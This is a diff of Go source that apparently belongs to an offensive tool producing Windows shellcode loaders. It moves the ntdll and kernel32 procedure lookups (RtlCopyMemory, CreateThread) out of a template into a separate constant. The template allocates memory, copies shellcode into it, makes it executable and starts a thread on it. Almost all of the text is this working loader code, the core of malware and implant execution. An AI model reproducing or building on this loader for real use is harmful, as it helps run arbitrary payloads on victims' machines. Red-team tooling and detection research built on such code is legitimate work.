@@ -14,6 +14,14 @@ const CreateThreadImports = `
 	"golang.org/x/sys/windows"
 `
 
+const CreateThreadDlls = `
+ntdll := windows.NewLazySystemDLL("ntdll.dll")
+kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+CreateThread := kernel32.NewProc("CreateThread")
+
+`
+
 const CreateThread = `
 	addr, errVirtualAlloc := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
@@ -25,8 +33,7 @@ const CreateThread = `
 		log.Fatal("[!]VirtualAlloc failed and returned 0")
 	}
 
-	ntdll := windows.NewLazySystemDLL("ntdll.dll")
-	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+
 	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
 	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
@@ -39,8 +46,7 @@ const CreateThread = `
 		log.Fatal(fmt.Sprintf("[!]Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
 	}
 
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	CreateThread := kernel32.NewProc("CreateThread")
+
 	thread, _, errCreateThread := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
 
 	if errCreateThread != nil && errCreateThread.Error() != "The operation completed successfully." {
